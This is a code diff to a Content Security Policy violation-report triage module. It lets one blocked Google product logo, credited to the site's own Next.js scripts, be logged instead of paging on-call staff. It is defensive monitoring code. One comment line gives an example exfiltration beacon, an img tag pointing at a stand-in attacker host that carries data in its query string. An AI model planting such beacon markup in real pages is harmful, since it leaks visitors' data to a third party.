@@ -192,6 +192,12 @@ export interface ViolationSummary {
   /** Whether the report named that source at all. The one place `(none)` is decided. */
   sourceNamed: boolean;
   /**
+   * The named source's URL alone, redacted like `source` but with no line or column, or
+   * null when no source is named. Kept apart so a decision about WHICH script it was
+   * parses a URL rather than a `url:line:column` string (#4063).
+   */
+  sourceUrl: string | null;
+  /**
    * What the browser did. `report` came from a report only policy and blocked
    * nothing; `unstated` is a browser that does not say (Safari's legacy body).
    */
@@ -213,6 +219,7 @@ export function summariseViolation(payload: unknown): ViolationSummary {
       referrer: "(none)",
       source: "(none)",
       sourceNamed: false,
+      sourceUrl: null,
       disposition: "unstated",
       fromExtension: false,
     };
@@ -224,6 +231,7 @@ export function summariseViolation(payload: unknown): ViolationSummary {
     referrer: redactReportUri(body.referrer),
     source: reportSource(body),
     sourceNamed: sourceNamed(body),
+    sourceUrl: sourceNamed(body) && body.source !== undefined ? redactReportUri(body.source) : null,
     disposition: body.disposition === "enforce" || body.disposition === "report" ? body.disposition : "unstated",
     fromExtension: [body.blocked, body.source].some((v) => v !== undefined && EXTENSION_SCHEME.test(v)),
   };
@@ -428,8 +436,9 @@ export type CspPageDecision =
  * be an injected-markup exfiltration beacon (`<img src=https://attacker/?d=...>`, CSS
  * exfil), so a refusal there may signal an injection attempt and keeps paging. The ACTIVE
  * and security-critical directives (script-src, connect-src, frame-src, object-src ...)
- * keep paging for the same reason, and so does a refusal of Slate's own origin or any
- * refusal that names a script source.
+ * keep paging for the same reason, and so does a refusal of Slate's own origin or a
+ * refusal that names a script source (the one exception is the Google product logo
+ * credited to a Slate page script, #4063, below).
  *
  * This logs and does NOT page, rather than trying to page only when "several distinct
  * visitors" hit the host: the only per-visitor signal a CSP report carries is the client
@@ -459,7 +468,8 @@ const GOOGLE_PRODUCT_LOGO_PATH = "/s/i/productlogos/";
  * nothing to anybody who planted it. The match is deliberately narrow: https, the host
  * exactly (no other port, no look alike or sibling subdomain), and the parsed path under
  * the product logo prefix, so a dot segment climbing out of it fails. Any other image from
- * that host, the same path on any other host, and a report naming a source all page.
+ * that host and the same path on any other host page, and so does a report naming any
+ * source but a Slate page script (#4063, see `isSlatePageScript`).
  * The policy is unchanged: the image is still blocked.
  */
 function isGoogleProductLogo(blocked: string): boolean {
@@ -491,16 +501,64 @@ function hostOf(value: string): string | null {
   }
 }
 
+/** Where Next serves Slate's own built page scripts, on the page's own origin. */
+const SLATE_PAGE_SCRIPT_PATH = "/_next/static/";
+
+/**
+ * Whether a report's named source is one of Slate's own built page scripts: an http(s) URL
+ * on exactly the document's origin (scheme, host and port), its parsed path under
+ * `/_next/static/`, so a dot segment climbing out of it fails (#4063). An inline or eval
+ * source, a source on any other origin (the embedding host page included), a Slate URL
+ * outside that path, and an unreadable document are all false, which pages.
+ *
+ * Why a named source does not settle who asked for the image (L799): Chrome credits a
+ * blocked load to whatever script is on the stack when the load FIRES, not to the code that
+ * added the element. On 2026-10-22 the add-on's injected Voice logo was credited to the
+ * embed's ResizeObserver callback, whose `scrollHeight` read forced the layout during which
+ * the image started loading. So a Slate page script as the source means only that Slate code
+ * was running at that moment.
+ */
+function isSlatePageScript(sourceUrl: string | null, document: string): boolean {
+  if (sourceUrl === null) return false;
+  let source: URL;
+  let page: URL;
+  try {
+    source = new URL(sourceUrl);
+    page = new URL(document);
+  } catch {
+    return false;
+  }
+  return (
+    (source.protocol === "https:" || source.protocol === "http:") &&
+    source.protocol === page.protocol &&
+    source.host === page.host &&
+    source.pathname.startsWith(SLATE_PAGE_SCRIPT_PATH)
+  );
+}
+
+/**
+ * Whether a report's named source still lets the refusal be logged rather than paged. Only
+ * the Google product logo under `img-src`, credited to a Slate page script (#4063, Dan
+ * 2026-10-22). Every other named source pages: a source is no proof Slate requested the
+ * resource (L799), but outside that one image nothing here can say what else it is.
+ */
+function namedSourceIsExempt(directive: string, v: ViolationSummary): boolean {
+  return directive === "img-src" && isGoogleProductLogo(v.blocked) && isSlatePageScript(v.sourceUrl, v.document);
+}
+
 /**
  * Whether a violation is the injected passive third-party class (#3417): true when it is
  * logged rather than paged, false when it pages at once. False on any doubt, which pages,
- * the safe direction. True needs all of: no named source, a concrete third-party origin,
- * a passive directive (or the one Google product logo under `img-src`, #3699), and a
- * host that is NOT the page's own.
+ * the safe direction. True needs all of: no named source (or, for the one Google product
+ * logo, a Slate page script as the source, #4063), a concrete third-party origin, a passive
+ * directive (or that logo under `img-src`, #3699), and a host that is NOT the page's own.
  */
 function isInjectedPassive(directive: string, v: ViolationSummary, blocked: BlockedResource): boolean {
   if (!isPassiveRefusal(directive, v.blocked)) return false;
-  if (v.sourceNamed) return false; // a named script is our own code; it pages
+  // A named source pages unless it is the logo credited to a Slate page script. Not because
+  // a named source proves Slate asked for the resource (it does not, L799), but because
+  // outside that one image the source is the only lead to what did.
+  if (v.sourceNamed && !namedSourceIsExempt(directive, v)) return false;
   if (blocked.kind !== "origin") return false; // inline/eval/data/blob/unreadable page at once
   const blockedHost = hostOf(blocked.origin);
   const documentHost = hostOf(v.document);
@@ -519,8 +577,9 @@ function isInjectedPassive(directive: string, v: ViolationSummary, blocked: Bloc
  * and Safari's legacy body never says.
  *
  * A THIRD non-paging reason, `injected-passive` (#3417): a passive third-party resource
- * no Slate page requests, with no named source, is almost always an extension and is
- * logged rather than paged (see isInjectedPassive).
+ * no Slate page requests, with no named source (or, for the Google product logo only, a
+ * Slate page script as the source, #4063), is almost always an extension and is logged
+ * rather than paged (see isInjectedPassive).
  *
  * Keyed on the DIRECTIVE, not one key for the whole policy: a stray image refusal
  * must not silence a script refusal behind it for the cooldown's length (L707).
